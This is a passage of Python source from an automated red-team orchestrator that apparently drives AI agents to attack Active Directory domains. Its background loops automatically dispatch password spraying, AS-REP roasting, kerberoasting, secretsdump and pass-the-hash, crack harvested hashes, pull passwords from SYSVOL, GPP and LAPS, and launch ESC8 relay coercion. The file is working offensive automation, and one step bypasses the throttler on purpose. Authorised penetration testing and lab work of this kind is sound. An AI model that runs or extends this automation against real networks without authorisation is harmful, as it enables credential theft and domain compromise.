                        f"(previous run used cross-trust creds, may have missed ACLs)"
                    )

                # Skip if ANY BloodHound task is already running for this domain
                # (prevents dispatching with a different credential while one is in-flight)
                domain_has_running_task = False
                for key, (tid, _ac, _at) in bloodhound_attempts.items():
                    if key[0] == domain_lower and tid in state.pending_tasks:
                        task_info = state.pending_tasks[tid]
                        if task_info.status != TaskStatus.COMPLETED:
                            domain_has_running_task = True
                            break
                if domain_has_running_task:
                    continue

                # Find a credential for this domain
                # First try same-domain creds, then cross-domain creds (trusts allow this)
                sorted_creds = sorted(
                    [c for c in state.all_credentials if c.has_usable_password],
                    key=lambda c: (
                        0 if (c.domain or "").lower() == domain.lower() else 1,
                        0 if c.is_admin else 1,
                    ),
                )
                for cred in sorted_creds:
                    cred_domain = (cred.domain or "").lower()
                    # Allow cross-domain enumeration via trusts
                    # (same-domain creds are sorted first above)

                    cred_key = (domain.lower(), cred.username.lower(), cred_domain)

                    # Check if we've already attempted with this credential
                    if cred_key in bloodhound_attempts:
                        task_id, attempt_count, last_attempt = bloodhound_attempts[cred_key]

                        # Check if the task completed successfully
                        bh_task = state.pending_tasks.get(task_id)
                        if bh_task and bh_task.status == TaskStatus.COMPLETED:
                            state.processed_bloodhound_domains.add(domain.lower())
                            logger.info(f"BloodHound collection succeeded for {domain}")
                            break

                        # Skip if max retries reached
                        if attempt_count >= max_retries:
                            continue

                        # Skip if still in cooldown
                        if current_time - last_attempt < retry_cooldown:
                            continue

                        # Check if task failed (not in pending_tasks means it completed/failed)
                        if task_id not in state.pending_tasks:
                            logger.info(
                                f"🔄 Auto-BloodHound: Retrying {domain} with {cred.domain}\\{cred.username} "
                                f"(attempt {attempt_count + 1}/{max_retries})"
                            )
                        else:
                            # Task still in progress — skip this DOMAIN entirely
                            # (don't try other creds while one is already running)
                            break
                    else:
                        attempt_count = 0

                    logger.info(
                        f"🩸 Auto-BloodHound: Dispatching collection for {domain} with {cred.domain}\\{cred.username}"
                    )

                    task_id = await dispatcher.request_recon(
                        source_agent="orchestrator",
                        domain=domain,
                        username=cred.username,
                        password=cred.password,
                        reason="bloodhound",
                        techniques=["run_bloodhound"],
                    )

                    # Always record attempt to prevent retry storm when throttled
                    # The deferred queue handles actual retries for deferred tasks
                    bloodhound_attempts[cred_key] = (task_id or "", attempt_count + 1, current_time)
                    if task_id:
                        logger.info(f"BloodHound task {task_id} dispatched for {domain}")
                    # Only dispatch one task per domain per cycle
                    break

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"BloodHound automation error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


def _make_cred_key(username: str, domain: str, password: str) -> str:
    """Generate consistent key for credential expansion tracking.

    Uses hashlib.md5 instead of Python's hash() because hash() returns
    different values across Python sessions (randomized since Python 3.3).
    This caused duplicate dispatches after orchestrator restarts.
    """
    pw_hash = hashlib.md5(password.encode(), usedforsecurity=False).hexdigest()[:8]
    return f"{domain.lower()}:{username.lower()}:{pw_hash}"


def _make_hash_key(username: str, domain: str, hash_value: str) -> str:
    """Generate consistent key for hash lateral movement tracking."""
    return f"{domain.lower()}:{username.lower()}:{hash_value[:32]}"


def _make_crack_key(username: str, domain: str, hash_value: str, hash_type: str) -> str:
    """Generate consistent key for crack request tracking."""
    return f"{domain.lower()}:{username.lower()}:{hash_value[:32]}:{hash_type.upper()}"


def _get_dc_ips(state: SharedRedTeamState) -> set[str]:
    """Get set of IPs that are known Domain Controllers."""
    dc_ips: set[str] = set()
    for host in state.all_hosts:
        if not host.ip:
            continue
        roles_str = str(host.roles).lower()
        if any(marker in roles_str for marker in ("dc", "domain controller", "ad dc")):
            dc_ips.add(host.ip)
    return dc_ips


def _has_exploitable_constrained_delegation_for_target(
    state: SharedRedTeamState, target_ip: str
) -> bool:
    """Check if there's an EXPLOITABLE constrained delegation vulnerability targeting this host.

    Only returns True if:
    1. A constrained delegation vulnerability exists targeting this host
    2. We have working credentials for the delegated account

    If we don't have credentials for the delegated account, the S4U path can't be used,
    so we should still try secretsdump instead of skipping it.

    Args:
        state: The shared red team state
        target_ip: The target IP to check

    Returns:
        True only if delegation exists AND we have credentials to exploit it
    """
    # Snapshot to avoid "dict changed size during iteration" from concurrent access
    for vuln in list(state.discovered_vulnerabilities.values()):
        if vuln.vuln_type != "constrained_delegation":
            continue

        # Defensive: ensure vuln.details is a dict before calling .get()
        details = vuln.details if isinstance(vuln.details, dict) else {}

        # Check if target matches the vulnerability's target
        target_matches = False
        vuln_target_ip = details.get("target_ip", "")
        if vuln_target_ip == target_ip:
            target_matches = True
        else:
            # Also check hostname in target_spn
            target_spn = details.get("target_spn", "")
            if target_spn:
                # Extract hostname from SPN (e.g., cifs/dc01.contoso.local -> dc01.contoso.local)
                spn_host = target_spn.split("/", 1)[1] if "/" in target_spn else ""
                for host in state.all_hosts:
                    if (
                        host.ip == target_ip
                        and host.hostname
                        and spn_host.lower() in host.hostname.lower()
                    ):
                        target_matches = True
                        break

        if not target_matches:
            continue

        # Target matches - now check if we have credentials for the delegated account
        account = details.get("account_name") or details.get("account", "")
        if not account:
            # No account info in vulnerability - can't determine exploitability
            # Be conservative and don't skip secretsdump
            continue

        # Check if we have working credentials for this account
        account_lower = account.lower().rstrip("$")
        has_working_creds = any(
            cred.username.lower() == account_lower and cred.password
            for cred in state.all_credentials
        )

        if has_working_creds:
            # We have credentials - S4U path is viable, skip secretsdump
            return True

        # No credentials for delegated account - S4U can't be used
        # Continue checking other vulns (there may be another exploitable one)

    return False


def _is_likely_privileged_credential(username: str, source: str | None) -> bool:
    """Check if credential is likely to have DA/DCSync rights.

    Returns True for:
    - Administrator account
    - Credentials obtained from secretsdump on a DC (likely DA)
    - Credentials with 'admin' in the name
    """
    username_lower = username.lower()
    if username_lower in ("administrator", "admin", "krbtgt"):
        return True
    if "admin" in username_lower:
        return True
    # Credentials from secretsdump are likely privileged if they came from a DC
    return bool(source and "secretsdump" in source.lower())


async def _auto_credential_access(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 15.0,  # Reduced from 60s for faster reaction
    min_hosts: int = 1,
) -> None:
    """
    Background task that proactively runs credential access techniques.

    1) If no creds/hashes yet, run no-creds AS-REP roast per domain.
    2) For each new credential/hash, run kerberoast + secretsdump attempts.
    3) When new users are discovered without credentials, run username_as_password.

    All tracking is persisted to state for recovery after restart.
    """
    # NOTE: All tracking now uses state fields instead of local variables
    # This enables recovery after orchestrator restart without duplicate work
    last_user_count: dict[str, int] = {}  # Only this stays local (non-critical)

    while True:
        try:
            state = dispatcher.shared_state
            logger.debug(
                f"🔄 _auto_credential_access loop tick: "
                f"hosts={len(state.all_hosts)}, creds={len(state.all_credentials)}, "
                f"hashes={len(state.all_hashes)}, "
                f"multi_forest={get_multi_forest_mode()}"
            )

            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping auto credential access")
                break

            if len(state.all_hosts) < min_hosts and not state.target:
                logger.debug(
                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) "
                    "before credential access"
                )
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            host_ips = [h.ip for h in state.all_hosts if h.ip]
            if not host_ips and state.target and state.target.ip:
                host_ips = [state.target.ip]

            _iter_hosts_by_domain: dict[str, list[str]] = {}
            for host in state.all_hosts:
                if not host.ip:
                    continue
                hostname = (host.hostname or "").lower()
                if "." in hostname:
                    host_domain = hostname.split(".", 1)[1]
                    _iter_hosts_by_domain.setdefault(host_domain, []).append(host.ip)
            if state.target and state.target.domain and state.target.ip:
                _iter_hosts_by_domain.setdefault(state.target.domain.lower(), []).append(
                    state.target.ip
                )

            # Build current domain set (computed from state each iteration)
            _iter_domains: set[str] = set()
            if state.target and state.target.domain:
                _iter_domains.add(state.target.domain)
            for cred in state.all_credentials:
                if cred.domain:
                    _iter_domains.add(cred.domain)
            for user in state.all_users:
                if user.domain:
                    _iter_domains.add(user.domain)

            if not _iter_domains:
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            has_new_creds = any(
                _make_cred_key(cred.username, cred.domain or "", cred.password or "")
                not in state.processed_cred_expansion
                for cred in state.all_credentials
            )
            has_new_hashes = any(
                _make_hash_key(hash_obj.username, hash_obj.domain or "", hash_obj.hash_value)
                not in state.processed_hash_lateral
                for hash_obj in state.all_hashes
            )
            has_new_cracks = any(
                _make_crack_key(
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    hash_obj.hash_type or "",
                )
                not in state.processed_crack_requests
                and not hash_obj.cracked_password
                for hash_obj in state.all_hashes
            )
            has_new_domains = (
                not state.all_credentials
                and not state.all_hashes
                and any(d.lower() not in state.processed_asrep_domains for d in _iter_domains)
            )
            # Check if any foreign domains need AS-REP/spray dispatch
            has_unprocessed_foreign = False
            if (state.all_credentials or state.all_hashes) and get_multi_forest_mode():
                _foreign_domains = state.get_undominated_forests()
                has_unprocessed_foreign = any(
                    fd.lower() not in state.processed_asrep_domains for fd in _foreign_domains
                )
            # Check if any domain has users but hasn't had password spray run yet
            has_unsprayed_users = any(
                d.lower() not in state.processed_password_spray
                and sum(1 for u in state.all_users if (u.domain or "").lower() == d.lower()) >= 3
                for d in _iter_domains
            )

            logger.debug(
                f"🔄 cred-access gate values: new_creds={has_new_creds}, "
                f"new_hashes={has_new_hashes}, new_cracks={has_new_cracks}, "
                f"new_domains={has_new_domains}, unsprayed={has_unsprayed_users}, "
                f"unprocessed_foreign={has_unprocessed_foreign}, "
                f"processed_asrep={state.processed_asrep_domains}"
            )
            if not (
                has_new_creds
                or has_new_hashes
                or has_new_cracks
                or has_new_domains
                or has_unsprayed_users
                or has_unprocessed_foreign
            ):
                if has_unprocessed_foreign is False and get_multi_forest_mode():
                    _undom = state.get_undominated_forests()
                    if _undom:
                        logger.info(
                            f"🌲 cred-access gate: undominated={_undom}, "
                            f"processed_asrep={state.processed_asrep_domains}, "
                            f"has_new_creds={has_new_creds}, has_new_hashes={has_new_hashes}, "
                            f"has_new_domains={has_new_domains}, _iter_domains={_iter_domains}"
                        )
                await dispatcher.wait_for_credential_access_signal(check_interval)
                continue

            if not state.all_credentials and not state.all_hashes:
                for domain in sorted(_iter_domains):
                    if domain.lower() in state.processed_asrep_domains:
                        continue
                    domain_hosts = _iter_hosts_by_domain.get(domain.lower(), []) or host_ips
                    # These techniques work without credentials:
                    # - asrep_roast: queries DC for accounts without pre-auth
                    # - username_as_password: auto-enumerates users via null session, then tests user=pass
                    # - password_spray: auto-enumerates users, sprays common passwords
                    fruit_task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        reason="low_hanging_fruit_no_creds",
                        techniques=[
                            "username_as_password",  # Auto-enumerates users, tests user:user
                            "password_spray",  # Auto-enumerates users, sprays common passwords
                            "asrep_roast",  # Users without pre-auth
                        ],
                    )
                    # Always mark as processed to prevent retry storm when throttled
                    # The deferred queue handles actual retries for deferred tasks
                    state.processed_asrep_domains.add(domain.lower())
                    if fruit_task_id:
                        logger.info(
                            f"Auto credential access (low-hanging fruit, no-creds) dispatched for domain {domain}"
                        )

            # Dispatch cross-forest credential_access for foreign domains
            # Only dispatched when we have a usable cross-forest credential
            # to avoid the LLM fabricating passwords.
            if state.all_credentials or state.all_hashes:
                foreign_domains = state.get_undominated_forests() if get_multi_forest_mode() else []
                if foreign_domains:
                    logger.info(
                        f"🌲 Foreign AS-REP check: domains={foreign_domains}, "
                        f"processed_asrep={state.processed_asrep_domains}, "
                        f"hosts_by_domain_keys={list(_iter_hosts_by_domain.keys())}"
                    )
                for fd in foreign_domains:
                    if fd.lower() in state.processed_asrep_domains:
                        continue
                    fd_hosts = _iter_hosts_by_domain.get(fd.lower(), [])
                    if not fd_hosts:
                        # Fallback: use DC IP from domain_controllers or dc_map
                        dc_ip = state.domain_controllers.get(fd.lower())
                        if dc_ip:
                            fd_hosts = [dc_ip]
                    if not fd_hosts:
                        # DNS SRV fallback to discover DC
                        try:
                            srv_cmd = ["dig", "+short", f"_ldap._tcp.{fd.lower()}", "SRV"]
                            srv_out, _, srv_rc = await _async_run_tool(srv_cmd, timeout_seconds=10)
                            if srv_rc == 0 and srv_out and srv_out.strip():
                                for line in srv_out.strip().split("\n"):
                                    parts = line.split()
                                    if len(parts) >= 4:
                                        dc_hostname = parts[3].rstrip(".")
                                        a_cmd = ["dig", "+short", dc_hostname, "A"]
                                        a_out, _, a_rc = await _async_run_tool(
                                            a_cmd, timeout_seconds=10
                                        )
                                        if a_rc == 0 and a_out and a_out.strip():
                                            resolved_ip = a_out.strip().split("\n")[0]
                                            fd_hosts = [resolved_ip]
                                            state.domain_controllers[fd.lower()] = resolved_ip
                                            from ares.core.models import Host

                                            state.add_host(
                                                Host(
                                                    ip=resolved_ip,
                                                    hostname=dc_hostname,
                                                    is_dc=True,
                                                )
                                            )
                                            logger.info(
                                                f"Resolved foreign DC via DNS: {dc_hostname} ({resolved_ip})"
                                            )
                                            break
                        except Exception:
                            pass
                    if not fd_hosts:
                        continue
                    # Bypass throttler — foreign domain recon is critical path
                    # and must not be deferred behind primary domain tasks
                    #
                    # Include a valid cross-forest credential so the agent can
                    # authenticate to the foreign DC via trust and use
                    # -target-domain for AS-REP/Kerberoast enumeration.
                    cross_cred = next(
                        (
                            c
                            for c in state.all_credentials
                            if c.has_usable_password and (c.domain or "").lower() != fd.lower()
                        ),
                        None,
                    )
                    if not cross_cred:
                        # Don't dispatch credential_access to foreign domains without
                        # a real credential — the LLM will fabricate passwords.
                        # Wait until we have a usable cross-forest credential.
                        logger.debug(
                            f"🌲 Skipping foreign domain {fd}: no cross-forest credential available yet"
                        )
                        continue
                    fd_payload: dict[str, object] = {
                        "domain": fd,
                        "target_ips": fd_hosts,
                        "reason": "low_hanging_fruit_foreign_domain",
                        "techniques": [
                            "username_as_password",
                            "password_spray",
                            "asrep_roast",
                        ],
                        "username": cross_cred.username,
                        "password": cross_cred.password,
                        "credential_domain": cross_cred.domain,
                        "note": (
                            f"Cross-forest credential: {cross_cred.username}@{cross_cred.domain} "
                            f"(not from {fd})."
                        ),
                    }
                    logger.info(
                        f"🌲 Including cross-forest credential "
                        f"{cross_cred.username}@{cross_cred.domain} "
                        f"for foreign domain {fd} enumeration"
                    )
                    if dispatcher._task_queue:
                        fruit_task_id = await dispatcher._task_queue.submit_task(
                            task_type="credential_access",
                            target_role="credential_access",
                            payload=fd_payload,
                            source_agent="orchestrator",
                            priority=2,
                        )
                        logger.info(
                            f"🌲 Foreign domain AS-REP/spray submitted directly "
                            f"(bypassed throttle) for {fd}: {fruit_task_id}"
                        )
                    state.processed_asrep_domains.add(fd.lower())

            # Check for new users without credentials - run username_as_password on them
            # This catches cases like testuser:testuser where username equals password
            for domain in sorted(_iter_domains):
                # Find users in this domain that don't have credentials
                domain_users = [
                    u.username
                    for u in state.all_users
                    if (u.domain or "").lower() == domain.lower()
                ]
                users_with_creds = {
                    c.username.lower()
                    for c in state.all_credentials
                    if (c.domain or "").lower() == domain.lower()
                }
                users_without_creds = [u for u in domain_users if u.lower() not in users_with_creds]

                # Find an existing credential for this domain to use for user enumeration
                enum_cred = None
                for c in state.all_credentials:
                    if (c.domain or "").lower() == domain.lower() and c.password:
                        enum_cred = c
                        break

                domain_hosts = _iter_hosts_by_domain.get(domain.lower(), []) or host_ips

                # Run username_as_password if we have enough users and haven't done it yet
                should_run_username_spray = domain.lower() not in state.processed_username_spray
                if domain.lower() in state.processed_username_spray:
                    # Re-run if we've discovered significantly more users
                    current_count = len(domain_users)
                    prev_count = last_user_count.get(domain.lower(), 0)
                    should_run_username_spray = current_count > prev_count + 5

                if should_run_username_spray and len(users_without_creds) >= 3:
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        username=enum_cred.username if enum_cred else "",
                        password=enum_cred.password if enum_cred else None,
                        reason="low_hanging_fruit_new_users",
                        techniques=["username_as_password"],
                    )
                    # Always mark as processed to prevent retry storm when throttled
                    state.processed_username_spray.add(domain.lower())
                    last_user_count[domain.lower()] = len(domain_users)
                    if task_id:
                        cred_info = (
                            f"{enum_cred.domain}\\{enum_cred.username}"
                            if enum_cred
                            else "null session"
                        )
                        logger.info(
                            f"Auto username_as_password dispatched for {len(users_without_creds)} users without creds in {domain} (using {cred_info} for enum)"
                        )

                # Run password_spray with common passwords if we have users and haven't done it
                # This is separate from username_as_password - we spray common passwords
                if domain.lower() not in state.processed_password_spray and len(domain_users) >= 3:
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=domain_hosts,
                        username=enum_cred.username if enum_cred else "",
                        password=enum_cred.password if enum_cred else None,
                        reason="low_hanging_fruit_password_spray",
                        techniques=["password_spray"],
                    )
                    # Always mark as processed to prevent retry storm when throttled
                    state.processed_password_spray.add(domain.lower())
                    if task_id:
                        logger.info(
                            f"Auto password_spray dispatched for {len(domain_users)} users in {domain}"
                        )

            # Get DC IPs for smart targeting
            dc_ips = _get_dc_ips(state)

            for cred in state.all_credentials:
                # Skip credentials without valid username - can't use for authenticated techniques
                if not cred.username or not cred.username.strip():
                    continue
                key = _make_cred_key(cred.username, cred.domain or "", cred.password or "")
                if key in state.processed_cred_expansion:
                    continue
                domain_name = cred.domain or (state.target.domain if state.target else "")
                domain_hosts = _iter_hosts_by_domain.get(domain_name.lower(), []) or host_ips

                # Separate DC hosts from non-DC hosts for smart credential usage
                non_dc_hosts = [h for h in domain_hosts if h not in dc_ips]
                dc_hosts_in_domain = [h for h in domain_hosts if h in dc_ips]

                # For non-DC hosts: always try secretsdump (might have local admin)
                cred_task_id: str | None = None
                if non_dc_hosts:
                    cred_task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain_name,
                        target_ips=non_dc_hosts,
                        username=cred.username,
                        password=cred.password,
                        credential_source=cred.source,
                        reason="new_credential_non_dc",
                        techniques=["kerberoast", "secretsdump"],
                    )

                # For DC hosts: only try secretsdump if credential is privileged OR
                # there's no EXPLOITABLE constrained delegation path (S4U) available.
                # NOTE: We only skip secretsdump if we have working credentials for the
                # delegated account. If the account is locked out or we don't have creds,
                # we should still try secretsdump as a fallback.
                for dc_ip in dc_hosts_in_domain:
                    has_s4u_path = _has_exploitable_constrained_delegation_for_target(state, dc_ip)
                    is_privileged = _is_likely_privileged_credential(cred.username, cred.source)

                    if has_s4u_path and not is_privileged:
                        # Skip secretsdump - S4U path is viable (we have creds for delegated account)
                        logger.info(
                            f"Skipping secretsdump on DC {dc_ip} for {cred.username}: "
                            f"exploitable constrained delegation path exists, use S4U instead"
                        )
                        continue

                    # Either privileged credential or no S4U path - try secretsdump
                    dc_task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain_name,
                        target_ips=[dc_ip],
                        username=cred.username,
                        password=cred.password,
                        credential_source=cred.source,
                        reason="new_credential_dc",
                        techniques=["kerberoast", "secretsdump"],  # No lsassy on DCs
                    )
                    if dc_task_id and not cred_task_id:
                        cred_task_id = dc_task_id

                # Also dispatch FAST credential discovery separately (only needs DC targets)
                # These are high-value low-hanging fruit that take ~2-5 seconds each
                # Running them separately ensures they complete quickly without getting
                # blocked by slow recon (smb_sweep) or credential dumping (secretsdump)
                # NOTE: These techniques require password auth (not hash), skip if no usable password
                if cred.has_usable_password:
                    dc_targets = dc_hosts_in_domain or domain_hosts[:1]
                    await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain_name,
                        target_ips=dc_targets,
                        username=cred.username,
                        password=cred.password,
                        credential_source=cred.source,
                        reason="fast_credential_discovery",
                        techniques=[
                            "sysvol_script_search",  # ~2 sec, hardcoded passwords in SYSVOL
                            "gpp_password_finder",  # ~2 sec, GPP/cpassword credentials
                            "ldap_search_descriptions",  # ~3 sec, passwords in user descriptions
                            "laps_dump",  # ~2 sec, LAPS local admin passwords
                        ],
                    )
                # Always mark as processed to prevent retry storm when throttled
                # The deferred queue handles actual retries for deferred tasks
                state.processed_cred_expansion.add(key)
                if cred_task_id:
                    logger.info(
                        f"Auto credential access dispatched for {cred.domain or '(unknown)'}\\{cred.username} (source={cred.source or 'unknown'})"
                    )

            for hash_obj in state.all_hashes:
                hash_key = _make_hash_key(
                    hash_obj.username, hash_obj.domain or "", hash_obj.hash_value
                )
                # Credential access (pass-the-hash) only for NTLM-compatible hashes
                if hash_key not in state.processed_hash_lateral:
                    if not _is_pass_the_hash_compatible(hash_obj.hash_value, hash_obj.hash_type):
                        logger.info(
                            f"Skipping credential access for {hash_obj.domain or '(unknown)'}\\{hash_obj.username}: non-NTLM hash type {hash_obj.hash_type or 'unknown'}"
                        )
                        state.processed_hash_lateral.add(hash_key)
                    else:
                        domain_name = hash_obj.domain or (
                            state.target.domain if state.target else ""
                        )
                        domain_hosts = (
                            _iter_hosts_by_domain.get(domain_name.lower(), []) or host_ips
                        )

                        # Separate DC hosts from non-DC hosts for smart hash usage
                        non_dc_hosts = [h for h in domain_hosts if h not in dc_ips]
                        dc_hosts_in_domain = [h for h in domain_hosts if h in dc_ips]

                        # For non-DC hosts: always try pass-the-hash
                        hash_task_id: str | None = None
                        if non_dc_hosts:
                            hash_task_id = await dispatcher.request_credential_access(
                                source_agent="orchestrator",
                                domain=domain_name,
                                target_ips=non_dc_hosts,
                                username=hash_obj.username,
                                hash_value=hash_obj.hash_value,
                                hash_type=hash_obj.hash_type,
                                reason="new_hash_non_dc",
                                techniques=["kerberoast", "secretsdump"],
                            )

                        # For DC hosts: only try if privileged or no EXPLOITABLE S4U path
                        # (requires credentials for the delegated account to be viable)
                        for dc_ip in dc_hosts_in_domain:
                            has_s4u_path = _has_exploitable_constrained_delegation_for_target(
                                state, dc_ip
                            )
                            is_privileged = _is_likely_privileged_credential(
                                hash_obj.username, hash_obj.source
                            )

                            if has_s4u_path and not is_privileged:
                                logger.info(
                                    f"Skipping secretsdump on DC {dc_ip} for {hash_obj.username} (hash): "
                                    f"exploitable constrained delegation path exists, use S4U instead"
                                )
                                continue

                            dc_task_id = await dispatcher.request_credential_access(
                                source_agent="orchestrator",
                                domain=domain_name,
                                target_ips=[dc_ip],
                                username=hash_obj.username,
                                hash_value=hash_obj.hash_value,
                                hash_type=hash_obj.hash_type,
                                reason="new_hash_dc",
                                techniques=["kerberoast", "secretsdump"],
                            )
                            if dc_task_id and not hash_task_id:
                                hash_task_id = dc_task_id

                        # Always mark as processed to prevent retry storm when throttled
                        state.processed_hash_lateral.add(hash_key)
                        if hash_task_id:
                            logger.info(
                                f"Auto credential access dispatched for {hash_obj.domain or '(unknown)'}\\{hash_obj.username} (hash_type={hash_obj.hash_type or 'unknown'})"
                            )

                # Crack requests for ALL hashes (AS-REP, Kerberoast, NTLM, etc.)
                crack_key = _make_crack_key(
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    hash_obj.hash_type or "",
                )
                if hash_obj.cracked_password:
                    state.processed_crack_requests.add(crack_key)
                    continue
                if crack_key in state.processed_crack_requests:
                    continue

                # Determine priority based on hash type
                # Kerberoast hashes have higher priority - service accounts often have weak passwords
                # AS-REP hashes also get boosted priority
                crack_priority = 5  # Default priority
                hash_value_lower = hash_obj.hash_value.lower()
                hash_type_upper = (hash_obj.hash_type or "").upper()

                if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
                    crack_priority = 2  # High priority - service accounts often weak
                    logger.info(
                        f"Kerberoast hash detected for {hash_obj.domain}\\{hash_obj.username}, boosting crack priority to {crack_priority}"
                    )
                elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
                    crack_priority = 3  # Medium-high priority
                    logger.info(
                        f"AS-REP hash detected for {hash_obj.domain}\\{hash_obj.username}, boosting crack priority to {crack_priority}"
                    )

                crack_task_id = await dispatcher.request_crack(
                    hash_value=hash_obj.hash_value,
                    hash_type=hash_obj.hash_type,
                    source_agent="orchestrator",
                    username=hash_obj.username,
                    domain=hash_obj.domain,
                    priority=crack_priority,
                )
                # Always mark as processed to prevent retry storm when throttled
                # The deferred queue handles actual retries for deferred tasks
                state.processed_crack_requests.add(crack_key)
                if crack_task_id:
                    logger.info(
                        f"Auto crack dispatched for {hash_obj.domain or '(unknown)'}\\{hash_obj.username} ({hash_obj.hash_type or 'unknown'}, priority={crack_priority})"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto credential access error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_crack_dispatch(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Dedicated background task for dispatching hash crack requests.

    This runs independently of _auto_credential_access to ensure crack tasks
    are always dispatched promptly when new hashes are discovered.

    Processes: AS-REP, Kerberoast, and other crackable hash types.
    """
    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # NOTE: Don't exit on has_domain_admin - we still want to crack hashes
            # after DA for reporting/persistence. Crack tasks don't use LLM tokens.
            if state.completed:
                logger.debug("Operation complete, stopping auto crack dispatch")
                break

            if not state.all_hashes:
                continue

            for hash_obj in state.all_hashes:
                # Skip already cracked
                if hash_obj.cracked_password:
                    continue

                # Build crack key for deduplication
                crack_key = _make_crack_key(
                    hash_obj.username,
                    hash_obj.domain or "",
                    hash_obj.hash_value,
                    hash_obj.hash_type or "",
                )

                if crack_key in state.processed_crack_requests:
                    continue

                # Determine priority based on hash type
                crack_priority = 5  # Default
                hash_value_lower = hash_obj.hash_value.lower()
                hash_type_upper = (hash_obj.hash_type or "").upper()

                if "$krb5tgs$" in hash_value_lower or "KERBEROAST" in hash_type_upper:
                    crack_priority = 2  # High priority - service accounts
                    logger.info(
                        f"Auto-crack: Kerberoast hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
                    )
                elif "$krb5asrep$" in hash_value_lower or "ASREP" in hash_type_upper:
                    crack_priority = 3  # Medium-high priority
                    logger.info(
                        f"Auto-crack: AS-REP hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
                    )
                else:
                    logger.info(
                        f"Auto-crack: {hash_obj.hash_type} hash for {hash_obj.domain}\\{hash_obj.username}, priority={crack_priority}"
                    )

                crack_task_id = await dispatcher.request_crack(
                    hash_value=hash_obj.hash_value,
                    hash_type=hash_obj.hash_type or "unknown",
                    source_agent="orchestrator",
                    username=hash_obj.username,
                    domain=hash_obj.domain or "",
                    priority=crack_priority,
                )

                # Only mark as processed when actually dispatched (non-empty task_id).
                # If the throttler rejected it (empty string), we must retry next cycle
                # so foreign domain hashes (e.g., missandei@essos.local) aren't permanently lost.
                if crack_task_id:
                    state.processed_crack_requests.add(crack_key)
                    logger.info(
                        f"Auto-crack dispatched: {hash_obj.domain}\\{hash_obj.username} ({hash_obj.hash_type}) -> {crack_task_id}"
                    )
                else:
                    logger.warning(
                        f"Auto-crack rejected for {hash_obj.domain}\\{hash_obj.username} "
                        f"({hash_obj.hash_type}) - will retry next cycle"
                    )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto crack dispatch error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_coercion(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that automatically triggers coercion attacks when conditions are met.

    Monitors for:
    1. ADCS servers with web enrollment → ESC8 relay attacks (ntlmrelayx + petitpotam)
    2. Domain controllers → petitpotam/coercer coercion for credential relay
    3. Writable shares → potential for file-based coercion (.lnk/.scf drops)

    This automates the coercion workflow that attackers would normally coordinate manually.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between coercion checks
    """
    # NOTE: All tracking now uses state fields for restart recovery
    # - state.processed_esc8_servers: ADCS servers we've started ESC8 against
    # - state.processed_state.processed_coerced_dcs: DCs we've attempted to coerce
    # - state.processed_writable_shares: "host:share" combos notified

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete (multi-forest aware)
            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping auto coercion")
                break

            # Need at least some credentials to make coercion worthwhile
            # (captured hashes need to be relayed or cracked)
            if not state.all_credentials and not state.all_hashes:
                logger.debug("Auto coercion: waiting for credentials before starting coercion")
                continue

            # Helper function to detect Domain Controllers
            def _is_dc(host: Host) -> bool:
                """Check if host is a Domain Controller.

                Detection methods:
                1. Explicit DC roles (from SRV lookup or BloodHound)
                2. DC services (Kerberos 88, LDAP 389)
                3. Hostname contains "dc"
                """
                # Check explicit roles (from SRV lookup, BloodHound, or manual tagging)
                if any(
                    r.lower() in ("dc", "domain controller", "domaincontroller", "ad dc")
                    for r in (host.roles or [])
                ):
                    return True
                # Check DC-like services (Kerberos, LDAP)
                for svc in host.services or []:
                    svc_lower = svc.lower()
                    if svc_lower.startswith(("88/tcp", "389/tcp")):
                        return True
                    if "kerberos" in svc_lower or "ldap" in svc_lower:
                        return True
                # Check if hostname contains "dc"
                return "dc" in (host.hostname or "").lower()

            # === ESC8 RELAY ATTACK ===
            # When ADCS servers with web enrollment are detected, start ntlmrelayx + petitpotam
            adcs_servers = dispatcher.find_adcs_servers()
            for server_ip, server_hostname in adcs_servers:
                if server_ip in state.processed_esc8_servers:
                    continue

                # Find a DC to coerce for ESC8 (DCs authenticating to ADCS = domain admin cert)
                dcs = [
                    h
                    for h in state.all_hosts
                    if _is_dc(h) and h.ip != server_ip  # Don't coerce the ADCS server to itself
                ]

                if not dcs:
                    logger.debug(f"Auto coercion: ADCS {server_ip} found but no DCs to coerce yet")
                    continue

                # Pick the first available DC
                target_dc = dcs[0]

                # Dispatch ESC8 coercion task
                # This will start ntlmrelayx to ADCS and coerce the DC
                task_id = await dispatcher.request_coercion(
                    source_agent="orchestrator",
